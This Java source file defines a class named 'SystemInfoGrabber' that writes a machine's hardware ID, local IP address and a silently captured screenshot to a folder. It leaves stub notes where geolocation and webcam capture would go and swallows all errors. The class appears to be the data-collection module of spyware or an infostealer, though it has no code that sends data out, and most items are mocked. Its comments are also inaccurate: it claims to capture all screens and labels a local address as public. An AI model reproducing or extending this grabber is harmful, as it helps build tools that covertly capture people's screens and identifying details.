import java.awt.Robot;
import java.awt.Rectangle;
import javax.imageio.ImageIO;
import java.io.File;
import java.net.InetAddress;
import java.net.URL;
import java.util.Scanner;

public class SystemInfoGrabber {

    public static void collectSystemInfo(String destDir) {
        try {
            // 1. HWID (Mocked - Real HWID requires WMI or native calls)
            String hwid = "HWID-" + java.util.UUID.randomUUID().toString();
            writeFile(destDir, "hwid.txt", hwid);

            // 2. IP Address
            String ip = InetAddress.getLocalHost().getHostAddress();
            writeFile(destDir, "ip_address.txt", "Public IP lookup required (use external service): " + ip);

            // 3. Geolocation (Requires external API or GPS hardware access - Mocked)
            // Real implementation would use a service like ipapi.com if network is available
            writeFile(destDir, "geolocation.txt", "Location data requires external API call.");

            // 4. Screenshots
            takeScreenshot(destDir);

            // 5. Webcam (Requires Java Media Framework or native code - Mocked warning)
            // Java standard library does not support webcam access directly without JNI/JNA
            writeFile(destDir, "webcam_status.txt", "Webcam capture requires native library (OpenCV/JMF).");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void takeScreenshot(String destDir) {
        try {
            Robot robot = new Robot();
            // Capture all screens
            Rectangle screenRect = new Rectangle(0, 0, 
                java.awt.Toolkit.getDefaultToolkit().getScreenSize().width,
                java.awt.Toolkit.getDefaultToolkit().getScreenSize().height);
            
            java.awt.image.BufferedImage image = robot.createScreenCapture(screenRect);
            File output = new File(destDir, "screen_capture.png");
            ImageIO.write(image, "png", output);
        } catch (Exception e) {
            // Ignore
        }
    }

    private static void writeFile(String dir, String name, String content) {
        // Simple file writing helper
        try (java.io.PrintWriter writer = new java.io.PrintWriter(new File(dir, name))) {
            writer.println(content);
        } catch (Exception e) {}
    }
}
